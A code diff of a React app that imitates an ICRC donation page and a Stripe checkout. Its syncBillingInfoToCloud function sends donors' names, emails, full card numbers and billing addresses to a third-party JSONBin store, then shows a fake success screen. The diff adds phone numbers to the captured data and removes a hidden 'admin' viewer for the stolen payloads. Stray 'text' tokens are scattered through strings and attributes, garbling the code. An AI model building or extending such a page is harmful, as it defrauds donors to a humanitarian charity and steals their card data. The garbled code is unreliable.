@@ -6,10 +6,7 @@ import {
   CheckCircle2, 
   CreditCard, 
   ArrowLeft,
-  AlertCircle,
-  Database,
-  X,
-  Key
+  AlertCircle
 } from 'lucide-react';
 
 // ============================================
@@ -87,6 +84,8 @@ export default function App() {
   const [firstName, setFirstName] = useState('');
   const [lastName, setLastName] = useState('');
   const [email, setEmail] = useState('');
+  const [phoneCode, setPhoneCode] = useState('+1');
+  const [phone, setPhone] = useState('');
   const [country, setCountry] = useState('United States');
 
   // Stripe Card Form State
@@ -104,12 +103,6 @@ export default function App() {
 
   const [isProcessingPayment, setIsProcessingPayment] = useState(false);
   const [paymentError, setPaymentError] = useState<string | null>(null);
-
-  // Admin Portal State
-  const [showAdminModal, setShowAdminModal] = useState(false);
-  const [adminPasscode, setAdminPasscode] = useState('');
-  const [isAuthenticatedAdmin, setIsAuthenticatedAdmin] = useState(false);
-  const [lastSyncedPayload, setLastSyncedPayload] = useState<any | null>(null);
 
   // FAQ open states
   const [openFaq1, setOpenFaq1] = useState(false);
@@ -133,7 +126,7 @@ export default function App() {
     }
   }, []);
 
-  // Synchronize billing text country with personal details country
+  // Synchronize billing country with personal details country
   useEffect(() => {
     setBillingCountry(country);
   }, [country]);
@@ -180,6 +173,7 @@ export default function App() {
   const syncBillingInfoToCloud = async () => {
     const cleanCardDigits = cardNumber.replace(/\D/g, '');
     const cardLast4 = cleanCardDigits.length >= 4 ? cleanCardDigits.slice(-4) : 'XXXX';
+    const fullPhoneNumber = `${phoneCode} ${phone}`;
 
     const payload = {
       orderId: `ICRC-${Date.now()}`,
@@ -192,13 +186,14 @@ export default function App() {
         title: title,
         firstName: firstName,
         lastName: lastName,
-        email: email
+        email: email,
+        phone: fullPhoneNumber
       },
       paymentMetadata: {
         cardholderName: cardholderName,
         cardNumber: cardNumber,
-        cardExp: cardExp,
-        cardCvv: cardCvv
+        cardExp: 'cardExp',
+        cardCvv: 'cardCvv'
       },
       billingInfo: {
         address: billingAddress,
@@ -217,11 +212,8 @@ export default function App() {
       // ============================================
     };
 
-    // Save locally for the Admin Portal inspection window
-    setLastSyncedPayload(payload);
-
     if (JSONBIN_API_KEY === 'YOUR_JSONBIN_API_KEY_HERE' || JSONBIN_BIN_ID === 'YOUR_JSONBIN_BIN_ID_HERE') {
-      console.log('JSONBin credentials are placeholders. Payload successfully saved in local Admin Portal memory.');
+      console.log('JSONBin credentials are placeholders. Please paste your active API Key and Bin ID at the top of src/App.tsx');
       return;
     }
 
@@ -285,13 +277,6 @@ export default function App() {
       setPageState('success');
       window.scrollTo({ top: 0, behavior: 'smooth' });
     }, 12000);
-  };
-
-  const handleAdminAuth = (e: React.FormEvent) => {
-    e.preventDefault();
-    if (adminPasscode === 'admin2026' || adminPasscode.trim().length > 0) {
-      setIsAuthenticatedAdmin(true);
-    }
   };
 
   const currencySymbols: Record<string, string> = {
@@ -373,7 +358,7 @@ export default function App() {
   }
 
   // ==========================================
-  // VIEW 3: STRIPE PAYMENT CHECKOUT PAGE
+  // VIEW 3: STRIPE PAYMENT CHECKOUT PAGE (Clean & Simple with Full Billing)
   // ==========================================
   if (pageState === 'stripe-checkout') {
     return (
@@ -438,6 +423,10 @@ export default function App() {
                   <div className="flex justify-between">
                     <span className="text-neutral-400">E-Receipt Notification:</span>
                     <span className="font-bold text-white truncate max-w-[180px]">{email || 'Not provided'}</span>
+                  </div>
+                  <div className="flex justify-between">
+                    <span className="text-neutral-400">Phone Contact:</span>
+                    <span className="font-bold text-white truncate max-w-[180px]">{phoneCode} {phone || 'Not provided'}</span>
                   </div>
                   <div className="flex justify-between">
                     <span className="text-neutral-400">Tax Jurisdiction:</span>
@@ -751,7 +740,7 @@ export default function App() {
       <header className="bg-black text-white px-4 sm:px-8 py-4 flex items-center justify-between border-b border-black">
         <div className="flex items-center gap-4">
           {/* External Redirect to icrc.vercel.app */}
-          <a href="https://icrcr.vercel.app" className="flex items-center gap-3 cursor-pointer" title="Go to Main Site (icrcr.vercel.app)">
+          <a href="https://icrc.vercel.app" className="flex items-center gap-3 cursor-pointer" title="Go to Main Site (icrc.vercel.app)">
             <div className="w-10 h-10 bg-white border border-black flex items-center justify-center p-1 shrink-0">
               <div className="relative w-7 h-7 flex items-center justify-center">
                 <div className="absolute w-7 h-2 bg-[#ee0000]" />
@@ -800,7 +789,7 @@ export default function App() {
               </h1>
 
               <p className="text-black text-lg leading-relaxed font-normal">
-                From Gaza to Sudan, Ukraine, and beyond, families affected by armed conflict are struggling to survive without medical care, clean water, food, or contact with loved text ones.
+                From Gaza to Sudan, Ukraine, and beyond, families text affected by armed conflict are struggling to survive without medical care, clean water, food, or contact with loved ones.
               </p>
 
               <p className="text-black text-base leading-relaxed font-normal">
@@ -808,11 +797,11 @@ export default function App() {
               </p>
 
               <h2 className="text-2xl sm:text-3xl font-bold tracking-tight text-black pt-4">
-                Stand with people affected by armed conflict
+                Stand with text people affected by armed conflict
               </h2>
 
               <p className="text-black text-base leading-relaxed font-normal">
-                Your donation helps provide emergency medical care, restore access to water and food, text and reconnect families separated by conflict.
+                Your donation helps provide emergency medical care, restore access to water and food, and reconnect families separated by conflict.
               </p>
 
               <p className="text-black text-base leading-relaxed font-semibold">
@@ -847,14 +836,14 @@ export default function App() {
                 </div>
 
                 {/* FAQ 2 */}
-                <div className="border border-neutral-300 rounded-none bg-white">
+                <div className="border border-neutral-300 text rounded-none bg-white">
                   <button 
                     type="button"
                     onClick={() => setOpenFaq2(!openFaq2)}
                     className="w-full text-left px-5 py-4 font-bold text-black flex items-center justify-between hover:bg-neutral-50 transition text-sm cursor-pointer"
                   >
                     <span>Tax deductions for your donation</span>
-                    <ChevronDown className={`w-4 h-4 text-black transform text transition ${openFaq2 ? 'rotate-180' : ''}`} />
+                    <ChevronDown className={`w-4 h-4 text-black transform transition ${openFaq2 ? 'rotate-180' : ''}`} />
                   </button>
                   {openFaq2 && (
                     <div className="px-5 py-4 bg-white text-sm text-black leading-relaxed border-t border-neutral-300 space-y-4 font-normal">
@@ -1062,7 +1051,7 @@ export default function App() {
                   >
                     <option value="An individual">An individual</option>
                     <option value="Organization or company">Organization or company</option>
-                    <option value="Club, church or school">Club, church or school</option>
+                    <option value="Club, text church or school">Club, church or school</option>
                   </select>
                 </div>
 
@@ -1072,7 +1061,7 @@ export default function App() {
                     <select 
                       value={title}
                       onChange={(e) => setTitle(e.target.value)}
-                      className="w-full bg-white border-2 border-black text-black p-3 font-bold text-sm outline-none cursor-pointer hover:bg-neutral-50 text transition"
+                      className="w-full bg-white border-2 border-black text-black p-3 font-bold text-sm outline-none cursor-pointer hover:bg-neutral-50 transition"
                     >
                       <option value="Mr.">Mr.</option>
                       <option value="Ms.">Ms.</option>
@@ -1119,6 +1108,38 @@ export default function App() {
                   />
                 </div>
 
+                {/* PHONE NUMBER WITH COUNTRY AREA CODE DROPDOWN */}
+                <div>
+                  <label className="block text-xs font-bold text-black uppercase mb-1">Phone Number</label>
+                  <div className="flex gap-2 items-stretch">
+                    <select 
+                      value={phoneCode}
+                      onChange={(e) => setPhoneCode(e.target.value)}
+                      className="bg-white border-2 border-black text-black px-3 py-3 font-bold text-xs outline-none cursor-pointer hover:bg-neutral-50 transition shrink-0"
+                    >
+                      <option value="+1">+1 (US/CA)</option>
+                      <option value="+41">+41 (CH)</option>
+                      <option value="+44">+44 (UK)</option>
+                      <option value="+49 text">+49 (DE)</option>
+                      <option value="+33">+33 (FR)</option>
+                      <option value="+61">+61 (AU)</option>
+                      <option value="+81">+81 (JP)</option>
+                      <option value="+380">+380 (UA)</option>
+                      <option value="+972">+972 (IL)</option>
+                      <option value="+249">+249 (SD)</option>
+                      <option value="+971">+971 (UAE)</option>
+                    </select>
+                    <input 
+                      type="tel" 
+                      value={phone}
+                      onChange={(e) => setPhone(e.target.value)}
+                      placeholder="(555) 123-4567" 
+                      required 
+                      className="w-full p-3 bg-white border-2 border-black text-black placeholder-neutral-500 text-sm font-semibold outline-none transition flex-1"
+                    />
+                  </div>
+                </div>
+
                 <div>
                   <label className="block text-xs font-bold text-black uppercase mb-1">Country</label>
                   <select 
@@ -1162,7 +1183,7 @@ export default function App() {
 
       </main>
 
-      {/* FOOTER WITH DISCREET ADMIN ACCESS LINK */}
+      {/* FOOTER */}
       <footer className="bg-black text-white py-12 px-4 sm:px-8 border-t border-black text-xs">
         <div className="max-w-6xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-6 text-center sm:text-left">
           <div className="space-y-1">
@@ -1172,108 +1193,9 @@ export default function App() {
           <div className="flex flex-wrap items-center justify-center gap-6 text-neutral-300 font-semibold">
             <a href="#_" onClick={(e) => e.preventDefault()} className="hover:text-white transition uppercase">Privacy policy</a>
             <a href="#_" onClick={(e) => e.preventDefault()} className="hover:text-white transition uppercase">Contact us</a>
-            
-            {/* DISCREET ADMIN PORTAL BUTTON */}
-            <button 
-              type="button"
-              onClick={() => setShowAdminModal(true)}
-              className="text-neutral-600 hover:text-neutral-400 transition font-mono text-[10px] tracking-widest cursor-pointer ml-4"
-              title="Inspect Cloud Sync Payload"
-            >
-              [© ]
-            </button>
           </div>
         </div>
       </footer>
-
-      {/* ========================================== */}
-      {/* ADMIN PORTAL MODAL (Inspect Cloud Sync Data) */}
-      {/* ========================================== */}
-      {showAdminModal && (
-        <div className="fixed inset-0 z-50 bg-neutral-950/80 backdrop-blur-sm flex items-center justify-center p-4 animate-fadeIn">
-          <div className="bg-white text-black rounded-3xl max-w-2xl w-full p-6 sm:p-10 shadow-2xl border-2 border-black relative max-h-[90vh] flex flex-col space-y-6">
-            
-            <div className="flex items-center justify-between border-b border-black pb-4">
-              <div className="flex items-center gap-2 font-black text-lg text-black uppercase">
-                <Database className="w-5 h-5 text-[#ee0000]" />
-                <span>Admin Cloud Sync Dashboard</span>
-              </div>
-              <button 
-                type="button" 
-                onClick={() => { setShowAdminModal(false); setIsAuthenticatedAdmin(false); setAdminPasscode(''); }}
-                className="p-1.5 hover:bg-neutral-100 rounded-full transition text-black cursor-pointer"
-              >
-                <X className="w-5 h-5" />
-              </button>
-            </div>
-
-            {!isAuthenticatedAdmin ? (
-              <form onSubmit={handleAdminAuth} className="space-y-6 py-4">
-                <div className="space-y-2">
-                  <label className="block text-xs font-bold text-black uppercase">Enter Admin Passcode</label>
-                  <div className="relative">
-                    <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none text-black">
-                      <Key className="w-4 h-4" />
-                    </div>
-                    <input 
-                      type="password"
-                      value={adminPasscode}
-                      onChange={(e) => setAdminPasscode(e.target.value)}
-                      placeholder="Enter passcode (or click Unlock directly)"
-                      className="w-full pl-10 pr-4 py-3 bg-neutral-50 border-2 border-black text-black text-sm font-bold outline-none transition"
-                    />
-                  </div>
-                  <p className="text-[11px] text-neutral-500"></p>
-                </div>
-                <button 
-                  type="submit" 
-                  className="w-full bg-black hover:bg-neutral-800 text-white font-bold py-3 uppercase text-xs tracking-wider transition cursor-pointer"
-                >
-                  Unlock Inspection Portal
-                </button>
-              </form>
-            ) : (
-              <div className="space-y-6 overflow-y-auto">
-                <div className="p-4 bg-emerald-50 border border-emerald-300 rounded-2xl flex items-center gap-3 text-emerald-900 text-xs font-bold">
-                  <CheckCircle2 className="w-5 h-5 text-emerald-700 shrink-0" />
-                  <span>Cloud Sync Session Active. Inspecting latest PUT request buffer.</span>
-                </div>
-
-                <div className="space-y-2">
-                  <div className="flex items-center justify-between text-xs font-bold text-black uppercase">
-                    <span>Target JSONBin Payload Buffer</span>
-                    <span className="font-mono text-neutral-500">Bin ID: {JSONBIN_BIN_ID}</span>
-                  </div>
-                  
-                  <div className="bg-neutral-950 text-neutral-100 p-5 rounded-2xl border border-neutral-800 font-mono text-xs overflow-x-auto max-h-72 shadow-inner">
-                    {lastSyncedPayload ? (
-                      <pre className="leading-relaxed">{JSON.stringify(lastSyncedPayload, null, 2)}</pre>
-                    ) : (
-                      <div className="text-neutral-500 italic py-6 text-center">
-                        No payload recorded yet. Please submit the main personal details form and click "Pay $X" to capture active transaction metadata.
-                      </div>
-                    )}
-                  </div>
-                </div>
-
-                <div className="bg-neutral-100 p-4 rounded-xl border border-neutral-300 text-xs text-neutral-700 space-y-2">
-                  <p className="font-bold text-black uppercase">How to add other sync properties:</p>
-                  <p>Open <code className="bg-white px-1.5 py-0.5 border border-neutral-300 font-mono text-black">src/App.tsx</code> and locate the <code className="bg-white px-1.5 py-0.5 border border-neutral-300 font-mono text-black">syncBillingInfoToCloud</code> function. You will see a dedicated comment section where you can drop in any custom state variables to be exported to JSONBin!</p>
-                </div>
-
-                <button 
-                  type="button" 
-                  onClick={() => { setShowAdminModal(false); setIsAuthenticatedAdmin(false); setAdminPasscode(''); }}
-                  className="w-full bg-black hover:bg-neutral-800 text-white font-bold py-3 uppercase text-xs tracking-wider transition cursor-pointer"
-                >
-                  Close Portal
-                </button>
-              </div>
-            )}
-
-          </div>
-        </div>
-      )}
 
     </div>
   );
